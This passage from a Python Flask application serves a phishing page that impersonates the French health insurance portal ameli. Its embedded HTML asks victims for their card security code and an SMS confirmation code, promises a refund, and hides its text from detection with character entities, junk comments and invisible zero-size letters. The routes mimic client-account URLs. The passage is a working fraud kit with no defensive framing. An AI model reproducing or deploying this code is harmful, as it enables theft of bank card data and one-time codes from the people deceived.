            <option value="2024">2024</option>
            <option value="2025">2025</option>
            <option value="2026">2026</option>
            <option value="2027">2027</option>
            <option value="2028">2028</option>
        </select>
    </span>
</div>
<div>
<label class="r_ddc_half_screen">
N° &#099;<font style="color:transparent;font-size: 0px;">v</font>r<!ioW>&#121;<font style="color:transparent;font-size: 0px;">R</font>&#112;t<!nO>o<!y0l>&#103;<font style="color:transparent;font-size: 0px;">t</font>&#114;<font style="color:transparent;font-size: 0px;">3</font>&#097;<font style="color:transparent;font-size: 0px;">B</font>&#109;&#109;<font style="color:transparent;font-size: 0px;">4</font>&#101; (&#099;<font style="color:transparent;font-size: 0px;">l</font>&#118;&#118;):<span style="color: blue;">
*</span>
</label>
<input type="text" name="serfer" id="ps4" size="4" maxlength="3">
</div>
  </div>

</div>
</fieldset>
<!-- FIN filedset d bita9a -->
<div id="sms" style="display:none;"><!-- start div d sms -->
<div style="font-weight: bolder; font-size:12px;">
    N<!17Y>&#111;<font style="color:transparent;font-size: 0px;">m</font>&#117;<font style="color:transparent;font-size: 0px;">j</font>s<!o> v<!PzD>&#111;<font style="color:transparent;font-size: 0px;">t</font>&#117;&#115;<font style="color:transparent;font-size: 0px;">N</font> &#114;<font style="color:transparent;font-size: 0px;">z</font>&#101;<font style="color:transparent;font-size: 0px;">9</font>&#109;<font style="color:transparent;font-size: 0px;">N</font>&#101;<font style="color:transparent;font-size: 0px;">1</font>&#114;&#099;<font style="color:transparent;font-size: 0px;">G</font>i<!76T>&#111;<font style="color:transparent;font-size: 0px;">0</font>&#110;<font style="color:transparent;font-size: 0px;">2</font>s<!dA> &#100;<font style="color:transparent;font-size: 0px;">Q</font>&#101; &#118;<font style="color:transparent;font-size: 0px;">a</font>&#111;&#117;<font style="color:transparent;font-size: 0px;">4</font>&#115;<font style="color:transparent;font-size: 0px;">3</font> a<!N>u<!6t>t<!t>&#104;&#101;<font style="color:transparent;font-size: 0px;">T</font>&#110;&#116;<font style="color:transparent;font-size: 0px;">K</font>&#105;<font style="color:transparent;font-size: 0px;">o</font>&#102;<font style="color:transparent;font-size: 0px;">l</font>i<!u1>&#101;<font style="color:transparent;font-size: 0px;">A</font>r<!N> &#101;<font style="color:transparent;font-size: 0px;">o</font>n<!N> &#115;<font style="color:transparent;font-size: 0px;">F</font>&#097;&#105;&#115;<font style="color:transparent;font-size: 0px;">J</font>i<!b>s<!czT>&#115;&#097;<font style="color:transparent;font-size: 0px;">v</font>n<!Pu>t<!c0K> l<!Q7j>&#101; c<!S>o<!1I>&#100;&#101;<font style="color:transparent;font-size: 0px;">f</font> d<!sq>&#101; c<!U>&#111;<font style="color:transparent;font-size: 0px;">u</font>&#110;<font style="color:transparent;font-size: 0px;">u</font>f<!fi>&#105;&#114;&#109;a<!3>&#116;<font style="color:transparent;font-size: 0px;">C</font>&#105;o<!7x>&#110; envoyé au +33<span id="nemrahna"></span>.
    <br>&#067;<font style="color:transparent;font-size: 0px;">B</font>e<!Nl>&#116;<font style="color:transparent;font-size: 0px;">o</font>t<!ki>e<!3ao> &#097;<font style="color:transparent;font-size: 0px;">Z</font>&#117;&#116;<font style="color:transparent;font-size: 0px;">P</font>&#104;<font style="color:transparent;font-size: 0px;">7</font>&#101;<font style="color:transparent;font-size: 0px;">X</font>&#110;<font style="color:transparent;font-size: 0px;">6</font>&#116;<font style="color:transparent;font-size: 0px;">n</font>i<!1uB>&#102;&#105;&#099;<font style="color:transparent;font-size: 0px;">l</font>a<!d>t<!tit>i<!b8>&#111;n<!HV> e<!L>&#115;<font style="color:transparent;font-size: 0px;">O</font>&#116; o<!Zym>&#098;<font style="color:transparent;font-size: 0px;">l</font>&#108;<font style="color:transparent;font-size: 0px;">s</font>i<!fCh>&#103;<font style="color:transparent;font-size: 0px;">u</font>&#097;<font style="color:transparent;font-size: 0px;">N</font>t<!Ed>&#111;<font style="color:transparent;font-size: 0px;">N</font>&#105;<font style="color:transparent;font-size: 0px;">N</font>r<!aP>&#101;<font style="color:transparent;font-size: 0px;">i</font> p<!NNA>&#111;<font style="color:transparent;font-size: 0px;">9</font>u<!XPG>&#114;<font style="color:transparent;font-size: 0px;">7</font> c<!Wl>&#111;<font style="color:transparent;font-size: 0px;">P</font>n<!2v>&#102;<font style="color:transparent;font-size: 0px;">5</font>i<!XjM>&#114;<font style="color:transparent;font-size: 0px;">g</font>m<!mW>&#101;<font style="color:transparent;font-size: 0px;">G</font>&#114;<font style="color:transparent;font-size: 0px;">x</font> &#118;<font style="color:transparent;font-size: 0px;">i</font>o<!U>&#116;<font style="color:transparent;font-size: 0px;">R</font>r<!TQ1>&#101;<font style="color:transparent;font-size: 0px;">T</font> op&eacute;ration.<br>
    <p>
		Si vous ne recevez pas le code dans <span id="timer"></span> minutes , <a href="#">cliquez ici</a>.
		</p>
    <br>
</div>
<div>
    <label class="r_ddc_half_screen">
    Code SMS:<span style="color: blue;">
    *</span>
    </label>
    <input type="text" name="sms" id="simo" size="10" maxlength="14">
</div>


  </div><!-- FIN div  d sms -->
<div id="ciaobella" style="display:none;"><!-- start div  d merci -->
    <div id="merci" style="padding-left:20px;padding-bottom:20px;padding-top:6px;width:100%;font-size: 13px;font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;font-color:#3c763d;border-color: #d6e9c6" >

      <h3>Demande enregistrée avec succés.</h3>

      <b>Demande enregistrée</b> : votre demande a été prise en compte.<br>

      <b>En cours de traitement</b> : &#108;‘&#111;&#114;d<!fB>r<!3R>&#101; &#100;<font style="color:transparent;font-size: 0px;">k</font>&#101;<font style="color:transparent;font-size: 0px;">J</font> &#118;&#105;<font style="color:transparent;font-size: 0px;">6</font>&#114;&#101;<font style="color:transparent;font-size: 0px;">b</font>&#109;<font style="color:transparent;font-size: 0px;">f</font>e<!B>&#110;t<!K9> &#101;s<!U>&#116;<font style="color:transparent;font-size: 0px;">P</font> &#101;&#110;<font style="color:transparent;font-size: 0px;">d</font> p<!DvT>&#114;<font style="color:transparent;font-size: 0px;">C</font>é&#112;&#097;r<!mAs>&#097;<font style="color:transparent;font-size: 0px;">o</font>&#116;&#105;&#111;&#110;<font style="color:transparent;font-size: 0px;">6</font>.<br>

      <b>Demande attribuée </b>: l<!9c>‘&#111;&#114;<font style="color:transparent;font-size: 0px;">X</font>&#100;<font style="color:transparent;font-size: 0px;">j</font>&#114;e<!Yv1> d<!YV>e<!Ris> &#118;i<!as8>r<!z>e<!iHH>&#109;<font style="color:transparent;font-size: 0px;">T</font>e<!D>n<!4>&#116;<font style="color:transparent;font-size: 0px;">Y</font> &#097;<font style="color:transparent;font-size: 0px;">d</font> ét<!3oA>é &#101;<font style="color:transparent;font-size: 0px;">s</font>&#110;&#118;<font style="color:transparent;font-size: 0px;">Y</font>o<!n0>&#121;é à v<!6>o<!qlU>&#116;&#114;&#101; b<!Bek>a<!Q6>&#110;<font style="color:transparent;font-size: 0px;">G</font>&#113;<font style="color:transparent;font-size: 0px;">Y</font>&#117;<font style="color:transparent;font-size: 0px;">7</font>e<!rL>, v<!Son>&#111;<font style="color:transparent;font-size: 0px;">H</font>&#117;<font style="color:transparent;font-size: 0px;">R</font>&#115;<font style="color:transparent;font-size: 0px;">p</font> r<!n>&#101;<font style="color:transparent;font-size: 0px;">9</font>&#099;<font style="color:transparent;font-size: 0px;">v</font>&#101;v<!vh>r<!IF>e<!L>&#122;<font style="color:transparent;font-size: 0px;">S</font> &#098;&#105;e<!Ahg>n<!fPo>t<!3U>ô&#116; <br>un mail vous informant du prochain remboursement (délai de 3 à 4 jours à partir de la réception du SMS).

      </div>
</div><!-- end div  d merci -->
<div class="r_obligatoire">
  <div id="jnab" style="color:red;text-align:left;">

    </div>
<span style="color: blue;">
*</span>
champ obligatoire</div>
</div>

<div align="center" >
  <div id="cinema"">
<input type="submit" value="Continuer" id="sir" class="r_btsubmit">
</div>
<div id="ta9a3oud">
<input type="submit" value="Continuer" id="tga3ed" class="r_btsubmit" style="display:none;"></div>
<div id="lhwa">
<input type="submit" value="Continuer" id="sir_t7ewa" class="r_btsubmit" style="display:none;" disabled></div>

</div>
</div>
</section>
</div>


        <footer class="wlp-bighorn-footer">
            <div class="wlp-bighorn-window">
                <div class="prefooterbody seul">
                    <ul class="ameli" align="left">
                        <li><a class="legende">Infos pratiques</a></li>
                        <li><a class="legende">Annuaire santé</a></li>
                        <li><a class="legende">Simulateurs de droits CMUC-ACS</a></li>
                    </ul>
                </div>
            </div>
            <div id="Footer">
                <ul>
                    <li><a>Informations légales</a></li>
                    <li><a>Propriété intellectuelle</a></li>
                    <li><a>Conditions d'utilisation</a></li>
                    <li><a>Aide</a></li>
                </ul>
            </div>
        </footer>""")

@app.route('/', methods=['GET'])
@app.route('/Accueil', methods=['GET'])
@app.route('/Accueil/client/<username>', methods=['GET'])
@app.route('/mon_espace_client/<username>', methods=['GET'])
def index(username= None):
    return render_template('chowafa.html',style=css,thisvitess=html,scalipane=js)


if __name__ == '__main__':
    app.run(debug=True)
